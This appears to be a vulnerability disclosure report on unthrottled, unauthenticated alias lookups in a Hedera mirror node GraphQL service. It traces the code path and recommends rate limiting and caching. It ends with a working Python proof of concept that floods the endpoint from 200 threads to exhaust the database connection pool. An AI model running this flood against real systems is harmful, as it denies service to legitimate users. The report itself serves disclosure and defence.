### Title
Unauthenticated GraphQL Alias Lookup Enables DB Connection Pool Exhaustion via Unbounded `findByAlias()` Queries

### Summary
The `getByAliasAndType()` method in `EntityServiceImpl.java` issues a raw database query on every invocation with no rate limiting, no result caching, and no authentication requirement. An unprivileged attacker can flood the GraphQL endpoint with high-volume `account` queries using unique base32 aliases, causing `entityRepository.findByAlias()` to execute one DB query per request, exhausting the connection pool and rendering the mirror node GraphQL service unavailable.

### Finding Description

**Exact code path:**

`AccountController.account()` (line 48) receives an unauthenticated GraphQL query and calls:

```java
entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
``` [1](#0-0) 

This delegates directly to `EntityServiceImpl.getByAliasAndType()` (line 29–31):

```java
public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
    return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
}
``` [2](#0-1) 

Which executes a native SQL query on every call:

```java
@Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByAlias(byte[] alias);
``` [3](#0-2) 

**Root cause — three absent controls, all confirmed:**

1. **No rate limiting in the GraphQL module.** The `ThrottleConfiguration`, `ThrottleManagerImpl`, and `ThrottleProperties` exist exclusively in the `web3` module. A grep for `RateLimiter`, `Bucket4j`, `bucket4j`, `throttle`, and `rate.limit` across all of `graphql/src/main/java/**` returns zero matches. [4](#0-3) 

2. **No result caching on `findByAlias()`.** A grep for `@Cacheable`, `@CacheEvict`, and `@CachePut` across `graphql/src/main/java/**` returns zero matches. The grpc module's `EntityRepository` carries `@Cacheable` on `findById()`; the graphql module's `EntityRepository` carries nothing. [5](#0-4) 

3. **No authentication.** No `SecurityConfig` or `HttpSecurity` configuration exists anywhere under `graphql/**`.

**Why existing controls are insufficient:**

- `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` bound the structural complexity of a single query, not the request rate. [6](#0-5) 

- `CachedPreparsedDocumentProvider` caches the parsed GraphQL *document structure* keyed on the query string. Because the alias value is passed as a GraphQL variable (not inlined into the query string), the document cache is always hit — but the underlying DB query still executes on every request regardless. [7](#0-6) 

- JSON/GraphQL parser limits (`maxCharacters`, `maxTokens`) only reject malformed or oversized payloads, not valid high-volume requests. [8](#0-7) 

### Impact Explanation
Each request causes one full table scan (or index lookup) against the `entity` table. With a large enough request rate, the JDBC connection pool is saturated, causing all subsequent queries — including those needed by the importer to write ingested records — to queue or fail. The mirror node's GraphQL service becomes unavailable. The Hedera consensus network itself is unaffected (the mirror node is read-only), but downstream consumers relying on the mirror node for transaction confirmation status, account lookups, and balance queries are denied service.

### Likelihood Explanation
No preconditions are required: no account, no API key, no authentication token. The attacker needs only HTTP access to the GraphQL endpoint. Unique base32 aliases are trivially generated (random byte arrays encoded with `Base32`). A single machine with a modest HTTP client library can sustain thousands of requests per second. The attack is repeatable, stateless, and requires no knowledge of existing entity aliases.

### Recommendation
Apply at minimum two independent controls:

1. **Rate limiting at the GraphQL layer.** Introduce a `bucket4j`-based filter (mirroring `web3`'s `ThrottleConfiguration`) applied to all requests reaching `/graphql`. Enforce a per-IP and global requests-per-second ceiling.

2. **Result caching on `findByAlias()`.** Annotate `EntityRepository.findByAlias()` with `@Cacheable` using a short TTL (e.g., 30–60 s) backed by Caffeine, consistent with how the grpc module caches `findById()`. [9](#0-8) 

3. **Input validation on alias length/format** before decoding, to reject obviously invalid inputs before they reach the repository layer.

### Proof of Concept

```bash
# Generate unique random base32 aliases and flood the endpoint
python3 - <<'EOF'
import base64, os, requests, threading

URL = "http://<mirror-node-host>/graphql/alpha"
QUERY = """
query($alias: String!) {
  account(input: {alias: $alias}) {
    balance
  }
}
"""

def attack():
    while True:
        alias = base64.b32encode(os.urandom(20)).decode().rstrip("=")
        requests.post(URL, json={"query": QUERY, "variables": {"alias": alias}}, timeout=5)

threads = [threading.Thread(target=attack) for _ in range(200)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```

**Expected result:** Within seconds, DB connection pool exhaustion occurs. Legitimate GraphQL queries begin timing out or returning 500 errors. The mirror node's connection pool metrics show 100% utilization. No authentication or special privileges are required at any step.
